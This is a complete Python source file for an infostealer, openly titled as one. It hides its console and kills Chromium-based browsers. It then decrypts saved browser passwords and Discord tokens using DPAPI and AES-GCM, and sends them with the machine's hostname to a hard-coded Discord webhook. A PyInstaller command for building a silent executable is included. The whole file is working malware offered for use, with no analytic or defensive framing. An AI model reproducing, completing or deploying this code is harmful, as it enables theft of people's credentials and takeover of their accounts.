# =====================================================================
# CHROME/DISCORD FULL STEALER – PASSWORDS + TOKENS → WEBHOOK
# Closes all Chromium browsers, extracts saved passwords + Discord tokens
# (tokens labelled ATD), and sends everything as plain text chunks.
# Compatible Python 3.4+.
# Replace WEBHOOK_URL below.
# Build: pyinstaller --onefile --noconsole --hidden-import=win32crypt --hidden-import=Cryptodome steal.py
# =====================================================================

import os
import sys
import json
import base64
import sqlite3
import shutil
import requests
import platform
import ctypes
import tempfile
import socket
import time
import re
import traceback
from datetime import datetime

# ========== CONFIGURATION ==========
WEBHOOK_URL = "https://discord.com/api/webhooks/1517713534480547931/fGPT9EmCUc9RYjUCHs108L-6Wgbg9iwhL5kUgmXAVRPKKqdBsJXA_FjiAUtSvV9W8ySY"
MAX_MESSAGE_LENGTH = 1900
# ===================================

LOG_FILE = os.path.join(tempfile.gettempdir(), "full_stealer.log")
def log(msg):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write("{} {}\n".format(datetime.now(), msg))
    except:
        pass

# ---- HIDE CONSOLE ----
try:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except:
    pass

# ---- KILL BROWSERS ----
def kill_browsers():
    exes = ["chrome.exe", "msedge.exe", "brave.exe", "opera.exe",
            "vivaldi.exe", "yandex.exe", "chromium.exe"]
    for exe in exes:
        os.system("taskkill /F /IM {} /T >nul 2>&1".format(exe))
    time.sleep(1.5)

# ---- DPAPI FALLBACK ----
class DPAPI:
    def __init__(self):
        self.crypt32 = ctypes.windll.crypt32
        self.kernel32 = ctypes.windll.kernel32
        self.crypt32.CryptUnprotectData.argtypes = [
            ctypes.POINTER(ctypes.wintypes.DATA_BLOB),
            ctypes.POINTER(ctypes.c_wchar_p),
            ctypes.POINTER(ctypes.wintypes.DATA_BLOB),
            ctypes.c_void_p,
            ctypes.POINTER(ctypes.wintypes.DATA_BLOB),
            ctypes.c_uint32,
            ctypes.POINTER(ctypes.wintypes.DATA_BLOB)
        ]
        self.crypt32.CryptUnprotectData.restype = ctypes.wintypes.BOOL

    def decrypt(self, encrypted_blob):
        blob_in = ctypes.wintypes.DATA_BLOB()
        blob_in.cbData = len(encrypted_blob)
        blob_in.pbData = ctypes.cast(encrypted_blob, ctypes.POINTER(ctypes.c_byte))
        blob_out = ctypes.wintypes.DATA_BLOB()
        if self.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
            data = ctypes.string_at(blob_out.pbData, blob_out.cbData)
            self.kernel32.LocalFree(blob_out.pbData)
            return data
        return None

dpapi = DPAPI()

try:
    import win32crypt
    HAVE_WIN32CRYPT = True
except ImportError:
    HAVE_WIN32CRYPT = False
    log("win32crypt not available, using raw DPAPI")

# AES for newer Chrome
try:
    from Cryptodome.Cipher import AES
    HAVE_CRYPTO = True
except ImportError:
    HAVE_CRYPTO = False
    log("pycryptodome missing, AES decryption disabled")

def decrypt_aes_gcm(key, data):
    if not HAVE_CRYPTO or key is None:
        return None
    try:
        nonce = data[3:15]
        ciphertext = data[15:-16]
        tag = data[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
    except:
        return None

def get_browser_key(local_state_path):
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        enc_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        if HAVE_WIN32CRYPT:
            return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
        else:
            return dpapi.decrypt(enc_key)
    except:
        return None

# ---- DISCORD TOKENS (ATD) ----
def find_tokens_in_leveldb(base_path, service_name):
    tokens = []
    if not os.path.isdir(base_path):
        return tokens
    local_state_path = os.path.join(os.path.dirname(base_path), 'Local State')
    if not os.path.exists(local_state_path):
        local_state_path = os.path.join(os.path.dirname(os.path.dirname(base_path)), 'Local State')
    key = None
    if os.path.exists(local_state_path):
        key = get_browser_key(local_state_path)
    for root, dirs, files in os.walk(base_path):
        if 'leveldb' in root:
            for file in files:
                if not (file.endswith('.ldb') or file.endswith('.log')):
                    continue
                try:
                    with open(os.path.join(root, file), 'r', errors='ignore') as f:
                        content = f.read()
                    for match in re.finditer(r'dQw4w9WgXcQ:([\w-]+)', content):
                        tok = match.group(1)
                        token = None
                        # Try AES with key
                        if key:
                            try:
                                raw = base64.b64decode(tok)
                                if raw[0] == 118:  # v1
                                    token = decrypt_aes_gcm(key, raw)
                            except:
                                pass
                        # DPAPI fallback
                        if not token:
                            try:
                                raw = base64.b64decode(tok)
                                decrypted = dpapi.decrypt(raw)
                                if decrypted:
                                    token = decrypted.decode('utf-8', errors='ignore')
                            except:
                                pass
                        if token:
                            tokens.append("[{}] Token: {}".format(service_name, token))
                except:
                    pass
    return tokens

def gather_all_tokens():
    all_tokens = []
    appdata = os.getenv('APPDATA')
    if not appdata:
        return all_tokens
    builds = [("discord", "Discord ATD"), ("discordptb", "Discord PTB"), ("discordcanary", "Discord Canary")]
    for folder, label in builds:
        base = os.path.join(appdata, folder)
        all_tokens.extend(find_tokens_in_leveldb(base, label))
    return all_tokens

# ---- BROWSER PASSWORDS ----
def extract_passwords(profile_path, key):
    login_db = os.path.join(profile_path, 'Login Data')
    if not os.path.exists(login_db):
        return []
    temp_db = os.path.join(tempfile.gettempdir(), "tmp_{}.db".format(os.urandom(6).hex()))
    try:
        shutil.copyfile(login_db, temp_db)
    except:
        return []
    creds = []
    conn = None
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, user, enc_pw in cursor.fetchall():
            if enc_pw:
                pw = decrypt_aes_gcm(key, enc_pw)
                if pw:
                    creds.append("{} | {} | {}".format(url, user, pw))
    except:
        pass
    finally:
        if conn:
            conn.close()
        try:
            os.remove(temp_db)
        except:
            pass
    return creds

def gather_all_passwords():
    browsers = [
        ('Chrome', 'Google\\Chrome'),
        ('Edge', 'Microsoft\\Edge'),
        ('Brave', 'BraveSoftware\\Brave-Browser'),
        ('Opera', 'Opera Software\\Opera Stable'),
        ('Vivaldi', 'Vivaldi\\User Data'),
        ('Yandex', 'Yandex\\YandexBrowser\\User Data'),
        ('Chromium', 'Chromium\\User Data'),
    ]
    all_creds = []
    local_appdata = os.getenv('LOCALAPPDATA')
    if not local_appdata:
        return all_creds
    for name, subpath in browsers:
        base = os.path.join(local_appdata, subpath, 'User Data')
        if not os.path.exists(base):
            continue
        local_state = os.path.join(base, 'Local State')
        key = get_browser_key(local_state)
        if not key:
            continue
        for profile in os.listdir(base):
            if profile == 'Default' or profile.startswith('Profile'):
                prof_path = os.path.join(base, profile)
                creds = extract_passwords(prof_path, key)
                if creds:
                    all_creds.append("[{} - {}]".format(name, profile))
                    all_creds.extend(creds)
    return all_creds

# ---- WEBHOOK SEND ----
def send_text(text):
    try:
        resp = requests.post(
            WEBHOOK_URL,
            json={"content": text},
            headers={"User-Agent": "Mozilla/5.0"},
            timeout=15
        )
        return resp.status_code in (200, 204)
    except:
        return False

def send_chunked(lines, prefix=""):
    """Send a list of strings, chunking to fit Discord message limit."""
    if not lines:
        return send_text(prefix + "No data.")
    full_text = prefix + "\n".join(lines)
    if len(full_text) <= MAX_MESSAGE_LENGTH:
        return send_text(full_text)
    # split into chunks
    chunks = []
    current = prefix
    for line in lines:
        if len(current) + len(line) + 1 > MAX_MESSAGE_LENGTH:
            chunks.append(current)
            current = line
        else:
            if current.endswith("\n"):
                current += line
            else:
                current += "\n" + line
    if current:
        chunks.append(current)
    success = True
    for chunk in chunks:
        if not send_text(chunk):
            success = False
        time.sleep(0.5)  # rate limit prevention
    return success

# ---- MAIN ----
def main():
    log("Full stealer started")
    kill_browsers()

    # Grab tokens
    tokens = gather_all_tokens()
    # Grab passwords
    passwords = gather_all_passwords()

    hostname = socket.gethostname()
    header = "Data from {}\n\n".format(hostname)

    # Send tokens
    token_prefix = header + "=== DISCORD TOKENS (ATD) ===\n"
    if tokens:
        send_chunked(tokens, token_prefix)
    else:
        send_text(token_prefix + "No tokens found.")

    time.sleep(1)

    # Send passwords
    pw_prefix = header + "=== BROWSER PASSWORDS ===\n"
    if passwords:
        send_chunked(passwords, pw_prefix)
    else:
        send_text(pw_prefix + "No passwords found.")

    log("Steal complete")

if __name__ == "__main__":
    try:
        main()
    except Exception:
        log(traceback.format_exc())
    sys.exit(0)